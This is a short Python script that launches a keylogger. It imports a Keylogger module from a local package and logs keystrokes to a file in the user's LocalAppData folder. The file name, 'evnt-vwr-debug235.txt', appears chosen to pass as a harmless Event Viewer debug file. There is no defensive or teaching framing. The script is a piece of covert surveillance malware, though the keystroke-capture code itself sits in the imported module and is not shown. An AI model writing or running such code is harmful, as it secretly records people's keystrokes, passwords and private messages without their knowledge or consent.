import os
from Modules import Keylogger

log_dir = os.environ['localappdata']
log_name = 'evnt-vwr-debug235.txt'

Keylogger.log_keystrokes(log_dir, log_name)
